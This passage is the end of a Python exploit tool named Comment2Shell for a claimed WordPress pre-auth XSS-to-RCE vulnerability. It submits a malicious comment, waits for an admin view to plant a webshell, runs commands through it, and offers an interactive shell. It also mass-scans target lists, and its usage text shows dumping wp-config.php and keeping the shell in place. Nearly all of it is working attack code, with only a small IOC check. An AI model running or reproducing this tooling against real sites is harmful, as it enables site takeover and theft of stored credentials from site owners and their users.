            "shell_path": shell_path, "post_id": post_id,
            "comment_approved": result.get("approved", False),
        }

    # Execute command
    cmd_out = None
    if command:
        log("info", f"Executing: {command}")
        cmd_out = exec_command(base_url, shell_path, command, proxy=proxy)
        print(f"{C_BLD}-- Output --{C_RST}")
        print(cmd_out)
        print(f"{C_BLD}-------------{C_RST}")
    else:
        log("info", "Shell ready - use -c \"cmd\" to execute or --shell for interactive")

    # Auto-cleanup
    cleaned = False
    if cleanup:
        log("info", "Cleaning up webshell...")
        cleaned = cleanup_shell(base_url, shell_path, proxy=proxy)
        if cleaned:
            log("ok", "Shell deleted - no persistence left")
        else:
            log("warn", "Cleanup incomplete - remove manually:")
            print(f"     {C_CYN}{base_url}/wp-content/plugins/{shell_path}?d=1{C_RST}")

    return {
        "success": True, "shell_path": shell_path,
        "command": command, "output": cmd_out,
        "cleaned": cleaned, "post_id": post_id,
    }


def run_exec_only(base_url, shell_path, command=None, proxy=None):
    """Execute command on an already-planted shell."""
    base_url = normalize_url(base_url)
    shell_path = shell_path.lstrip("/")

    # Normalize to relative path under wp-content/plugins/
    if shell_path.startswith("wp-content/plugins/"):
        rel_path = shell_path[len("wp-content/plugins/"):]
    elif shell_path.startswith("wp-content/"):
        rel_path = shell_path[len("wp-content/"):]
    else:
        rel_path = shell_path

    if "/" not in rel_path:
        rel_path = f"{rel_path}/{rel_path}.php"
    elif not rel_path.endswith(".php"):
        rel_path += ".php"

    # exec_command expects relative path (it prepends wp-content/plugins/)
    ok, out = verify_shell(base_url, rel_path, proxy=proxy)
    if not ok:
        log("err", f"Shell not reachable at {base_url}/wp-content/plugins/{rel_path}")
        if out:
            log("info", f"Response: {out[:200]}")
        return {"success": False}

    log("ok", f"Shell verified: {out.split(chr(10))[0]}")

    if command:
        cmd_out = exec_command(base_url, rel_path, command, proxy=proxy)
        print(f"{C_BLD}-- Output --{C_RST}")
        print(cmd_out)
        return {"success": True, "output": cmd_out}
    else:
        interactive_shell(base_url, rel_path, proxy=proxy)
        return {"success": True}


def run_probe(base_url, callback=None, timeout=15, proxy=None):
    """Submit benign detection XSS payload (no RCE, just proof of XSS)."""
    base_url = normalize_url(base_url)
    log("info", f"Probe mode: {base_url}")

    ver, _ = detect_version(base_url, timeout=timeout)
    if ver:
        log("info", f"WordPress version: {'.'.join(map(str, ver))}")

    post_id = find_post_id(base_url, timeout=timeout)
    if not post_id:
        log("err", "No commentable post found")
        return {"success": False}

    js = build_detection_js(callback_url=callback)
    payload = build_xss_comment(js)
    result = submit_comment(base_url, post_id, payload, timeout=timeout, proxy=proxy)

    status = "APPROVED" if result.get("approved") else (
        "PENDING" if result.get("pending") else "UNKNOWN"
    )
    log("ok" if not result.get("failed") else "err",
        f"Comment submitted: {status}")

    if callback:
        log("info", f"XSS fires when anyone views post -> check OAST: {callback}")
    else:
        log("info", f"Visit {base_url}/?p={post_id} to see if XSS fires (check document.title)")

    return {"success": not result.get("failed"), "status": status,
            "post_id": post_id}


# -- CLI ----------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        prog="comment2shell",
        description="Comment2Shell - CVE-2026-93485 WordPress Pre-Auth XSS -> RCE",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --scan -t https://target.com
  %(prog)s --scan -f targets.txt --threads 20
  %(prog)s --probe -t https://target.com
  %(prog)s -t https://target.com -c "id"
  %(prog)s -t https://target.com -c "cat wp-config.php" --wait 60
  %(prog)s -t https://target.com -c "id" --no-cleanup
  %(prog)s -t https://target.com -c "id" --callback https://xxx.oast.example
  %(prog)s --shell -t https://target.com --shell-path ab12cd/ab12cd.php
  %(prog)s --exec -t https://target.com --shell-path ab12cd/ab12cd.php -c "whoami"
  %(prog)s --ioc -t https://target.com

Modes (choose one):
  --scan    Passive version scan (safe)
  --probe   Submit benign XSS detection (safe-ish)
  --exploit Full exploit chain (default when -c is given)
  --shell   Interactive shell (requires --shell-path)
  --exec    Execute single command on existing shell
  --ioc     Check for Comment2Shell IOCs

Exploit flow (-t + -c):
  1. Auto-generate random webshell name
  2. Submit XSS comment (zero-click alert PoC)
  3. Poll until shell appears (admin must view post)
  4. Execute your command
  5. Auto-delete shell (--no-cleanup to keep)
        """,
    )

    # Target
    parser.add_argument("-t", "--target", help="Target URL")
    parser.add_argument("-f", "--file", help="File with target URLs (one per line)")
    parser.add_argument("--stdin", action="store_true", help="Read targets from stdin")

    # Modes
    mode = parser.add_mutually_exclusive_group()
    mode.add_argument("--scan", action="store_true", help="Passive version scan")
    mode.add_argument("--probe", action="store_true", help="Submit benign XSS detection")
    mode.add_argument("--exploit", action="store_true", help="Full exploit chain")
    mode.add_argument("--shell", action="store_true", help="Interactive shell mode")
    mode.add_argument("--exec", dest="exec_mode", action="store_true",
                      help="Execute command on existing shell")
    mode.add_argument("--ioc", action="store_true", help="Check for IOCs")

    # Exploit options
    parser.add_argument("-c", "--cmd", help="Command to execute (triggers exploit mode)")
    parser.add_argument("--callback", help="OAST/interactsh callback URL for notifications")
    parser.add_argument("--shell-path", help="Existing webshell path (for --shell/--exec)")
    parser.add_argument("--post-id", type=int, help="Target post ID (auto-discover if not set)")
    parser.add_argument("--known-commenter", action="store_true",
                        help="Use default 'A WordPress Commenter' for approval bypass")
    parser.add_argument("--wait", type=int, default=45,
                        help="Seconds to poll for webshell after submission (default: 45, 0=skip)")
    parser.add_argument("--no-cleanup", action="store_true",
                        help="Keep the webshell after execution (default: auto-delete)")

    # Scan options
    parser.add_argument("--threads", type=int, default=10, help="Scan threads (default: 10)")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout (default: 10s)")

    # Network
    parser.add_argument("--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--json", action="store_true", help="JSON output")

    # Misc
    parser.add_argument("-o", "--output", help="Save results to file")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument("--version", action="version",
                        version="Comment2Shell 1.0.0 (CVE-2026-93485)")

    args = parser.parse_args()

    # Auto-detect mode from -c
    if args.cmd and not args.scan and not args.probe and not args.ioc \
            and not args.shell and not args.exec_mode:
        args.exploit = True

    # Default to scan if no mode specified
    if not any([args.scan, args.probe, args.exploit, args.shell,
                args.exec_mode, args.ioc]):
        args.scan = True

    # Collect targets
    targets = []
    if args.target:
        targets.append(args.target)
    if args.file:
        try:
            with open(args.file) as f:
                targets.extend(l.strip() for l in f if l.strip() and not l.startswith("#"))
        except FileNotFoundError:
            log("err", f"File not found: {args.file}")
            sys.exit(1)
    if args.stdin:
        targets.extend(l.strip() for l in sys.stdin if l.strip())

    if not targets:
        parser.print_help()
        sys.exit(1)

    # -- SCAN MODE --
    if args.scan:
        log("info", f"Scanning {len(targets)} target(s)...")
        results = run_scan(targets, threads=args.threads,
                          timeout=args.timeout, proxy=args.proxy)

        vuln_count = sum(1 for r in results if r["vulnerable"] is True)
        wp_count = sum(1 for r in results if r["wordpress"])
        print()
        log("info", f"Results: {vuln_count} vulnerable / {wp_count} WordPress / {len(results)} total")

        if args.json or args.output:
            output = json.dumps(results, indent=2)
            if args.output:
                with open(args.output, "w") as f:
                    f.write(output)
                log("ok", f"Results saved to {args.output}")
            if args.json:
                print(output)

        if vuln_count > 0:
            print()
            log("vuln", "Vulnerable targets:")
            for r in results:
                if r["vulnerable"]:
                    print(f"    {C_RED}{r['target']}{C_RST}  (WP {r['version']})")
        sys.exit(0 if vuln_count > 0 else 1)

    # -- PROBE MODE --
    if args.probe:
        for t in targets:
            run_probe(t, callback=args.callback, timeout=args.timeout,
                     proxy=args.proxy)
        sys.exit(0)

    # -- IOC MODE --
    if args.ioc:
        total = 0
        for t in targets:
            base = normalize_url(t)
            log("info", f"Checking IOCs on {base}")
            findings, notes = check_ioc_remote(base, timeout=args.timeout, proxy=args.proxy)
            for n in notes:
                log("info", n)
            if findings:
                for i in findings:
                    log("vuln", i)
                total += len(findings)
            else:
                log("ok", "No IOCs detected")
        sys.exit(1 if total else 0)

    # -- SHELL MODE --
    if args.shell:
        if not args.target or not args.shell_path:
            log("err", "--shell requires -t and --shell-path")
            sys.exit(1)
        interactive_shell(normalize_url(args.target), args.shell_path,
                         proxy=args.proxy)
        sys.exit(0)

    # -- EXEC MODE --
    if args.exec_mode:
        if not args.target or not args.shell_path:
            log("err", "--exec requires -t and --shell-path")
            sys.exit(1)
        result = run_exec_only(args.target, args.shell_path,
                               command=args.cmd, proxy=args.proxy)
        sys.exit(0 if result["success"] else 1)

    # -- EXPLOIT MODE --
    if args.exploit:
        all_results = []
        for t in targets:
            r = run_exploit(
                t,
                command=args.cmd,
                callback=args.callback,
                timeout=args.timeout,
                proxy=args.proxy,
                use_known_commenter=args.known_commenter,
                post_id=args.post_id,
                wait=args.wait,
                cleanup=not args.no_cleanup,
            )
            all_results.append(r)

        if args.output:
            with open(args.output, "w") as f:
                json.dump(all_results, f, indent=2)
            log("ok", f"Results saved to {args.output}")

        sys.exit(0 if any(r.get("success") for r in all_results) else 1)


if __name__ == "__main__":
    main()
